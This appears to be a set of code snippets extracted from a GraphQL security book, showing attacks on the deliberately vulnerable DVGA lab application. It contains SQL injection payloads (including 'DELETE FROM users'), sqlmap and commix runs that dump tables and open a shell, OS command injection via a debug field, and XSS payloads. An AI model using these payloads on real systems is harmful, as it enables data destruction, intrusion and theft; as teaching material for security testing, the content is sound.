["```\nquery {\n   pastes {\n      id\n      ipAddr\n   }\n}\n```", "```\nquery {\n   pastes(**limit: 100**) {\n      id\n      ipAddr\n   }\n}\n```", "```\nmutation {\n createPaste(content: \"Some content\", title:\"Some title\", public: false) {\n   paste {\n    id\n    ipAddr\n   }\n }\n}\n```", "```\nINSERT INTO pastes (content, title, public)\nVALUES ('some_malicious_content', 'some_title', false)\n```", "```\nmutation {\n createPaste(content: \"**content'); DELETE FROM users; --**\") {\n   paste {\n    id\n    ipAddr\n   }\n }\n}\n```", "```\nINSERT INTO pastes (content) VALUES ('**content'); DELETE FROM users; --**\n```", "```\nquery {\n  users {\n    username(capitalize: true)\n    id\n  }\n}\n```", "```\nquery {\n  pastes {\n    id\n    ipAddr @show_network(style: \"cidr\")\n  }\n}\n```", "```\nquery GetDirectives {\n  __schema {\n    directives {\n      name\n      description\n      locations\n    }\n  }\n}\n```", "```\n**query {**\n **pastes(filter:\"My First Paste\") {**\n **id**\n **content**\n **title**\n **}**\n**}**\n```", "```\n\"pastes\": [\n  {\n `--snip--`\n    \"title\":\"Testing Testing\",\n    \"content\":\"My First Paste\"\n `--snip--`\n  }\n]\n```", "```\nSELECT id, content, title FROM pastes WHERE content LIKE 'My First Paste'\n```", "```\nquery {\n pastes(filter:\"**My First Paste'**\") {\n    id\n    content\n    title\n }\n}\n```", "```\n query {\n  pastes(filter:\"My First Paste' or 1=1--\") {\n    title\n    content\n  }\n}\n```", "```\nSELECT id, content, title FROM pastes WHERE content LIKE '**My First Paste' or 1=1—-'**\n```", "```\nquery {\n  pastes(filter:\"test*****\") {\n     id\n  }\n}\n```", "```\n# **sqlmap -r request.txt —dbms=sqlite —tables**\n\n[14:30:53] [INFO] parsing HTTP request from 'request.txt'\ncustom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] **Y**\n\nJSON data found in POST body. Do you want to process it? [Y/n/q] **n**\n\n[14:30:55] [INFO] testing connection to the target URL\nit is recommended to perform only basic UNION tests if there is not at least one\nother (potential) technique found. Do you want to reduce the number of requests? [Y/n] **Y**\n\n[14:30:57] [INFO] testing 'Generic UNION query (NULL) — 1 to 10 columns'\n(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the\nothers (if any)? [y/N] **N**\n\nParameter: #1* ((custom) POST)\n    Type: UNION query\n    Title: Generic UNION query (NULL) — 1 column\n    Payload: {\"query\":\"query getPastes {\\n        pastes(filter:\\\"test' UNION ALL\nSELECT CHAR(113,122,98,122,113)||CHAR(102,90,76,111,106,97,117,117,105,113,101,121,\n72,117,112,87,114,99,114,65,99,86,84,120,72,69,115,122,120,77,121,119,122,103,108,\n116,87,100,114,82)||CHAR(113,122,98,98,113),NULL,NULL,NULL,NULL,NULL,NULL,\nNULL—bGJM\\\") {\\n          id\\n          title\\n          content\\n\nipAddr\\n          userAgent\\n          owner {\\n            name\\n\n}\\n          }\\n        }\"}\n```", "```\n# **sqlmap -r request.txt --dbms=sqlite --tables**\n\n[14:34:05] [INFO] fetching tables for database: 'SQLite_masterdb'\n<current>\n[5 tables]\n+------------+\n| audits     |\n| owners     |\n| pastes     |\n| servermode |\n| users      |\n+------------\n```", "```\n@app.route('/download', methods=['POST'])\ndef download():\n  ❶ url = request.form['url']\n  ❷ os.system('wget {} -P /data/downloads'.format(url))\n    return redirect('/dashboard')\n```", "```\nwget http://example.com/file.zip -P /data/downloads\n```", "```\n**query {**\n **systemDebug**\n**}**\n```", "```\n\"systemDebug\": \"    PID TTY          TIME CMD\\n  11999 pts/1    00:00:00 bash\\n\n14050 pts/1    00:00:00 python3\\n  14055 pts/1    00:00:03 python3\\n  14135 pts/1\n00:00:00 sh\\n  14136 pts/1    00:00:00 ps\\n\"\n```", "```\n**query {**\n **systemDebug(arg:\"ef\")**\n**}**\n```", "```\n**query {**\n **systemDebug(arg:\"; uptime\")**\n**}**\n```", "```\nPID TTY          TIME CMD\\n  11999 pts/1    00:00:00 bash\\n  14050 pts/1\n1 user,  load average: 0.71, 0.84, 0.91\\n\"\n```", "```\n# **commix --url=\"http://127.0.0.1:5013/graphql\"**\n**--data='{\"query\":\"query{systemDebug(arg:\\\"test \\\")}\"}' -p arg**\n\n[info] Testing connection to the target URL.\nYou have not declared cookie(s), while server wants to set its own.\n\nDo you want to use those [Y/n] > **Y**\n[info] Performing identification checks to the target URL.\nDo you recognize the server's operating system? [(W)indows/(U)nix/(q)uit] > **U**\nJSON data found in POST data. Do you want to process it? [Y/n] > **Y**\nIt appears that the value 'query{systemDebug(arg:\\\"test\\\")}' has boundaries.\nDo you want to inject inside? [Y/n] > **Y**\n\n[info] Testing the (results-based) classic command injection technique.\n[info] **The POST (JSON) parameter 'arg' seems injectable** via (results-based)\nclassic command injection technique.\n       |_ echo UTKFLI$((13+45))$(echo UTKFLI)UTKFLI\n\nDo you want a Pseudo-Terminal shell? [Y/n] > **Y**\nPseudo-Terminal (type '?' for available options)\n\ncommix(os_shell) > **ls**\n\n__pycache__ app.py config.py core db dvga.db pastes requirements.txt\nsetup.py static templates version.py\n```", "```\ndef resolve_system_debug(self, info, arg=None):\n  Audit.create_audit_entry(info)\n  if arg:\n    output = helpers.run_cmd('ps {}'.format(arg))\n  else:\n    output = helpers.run_cmd('ps')\n  return output\n```", "```\noutput = helpers.run_cmd('ps ef')\n```", "```\nquery {\n   hello(msg:\"Black Hat GraphQL\")\n}\n```", "```\nquery {\n   hello(msg:\"<script>document.cookie;</script>\")\n}\n```", "```\nhttp://example.com/graphql?query=query%20%7B%0A%20%20hello(msg%3A%22hello%22)%0A%7D\n```", "```\nhttp://example.com/graphql?query=query {\n  hello(msg:\"hello\")\n}\n```", "```\n# **document.title**\n\n'Damn Vulnerable GraphQL Application'\n```", "```\n**mutation SpoofedOperationName {**\n **createPaste(title:\"Black Hat GraphQL\", content:\"I just spoofed the operation name.\") {**\n **paste {**\n **content**\n **title**\n **}**\n **}**\n**}**\n```", "```\nmutation {\n  createPaste(title:\"XSS\", content:\"<script>alert(\\\"XSS\\\")</script>\") {\n    paste {\n      title\n      content\n    }\n  }\n}\n```"]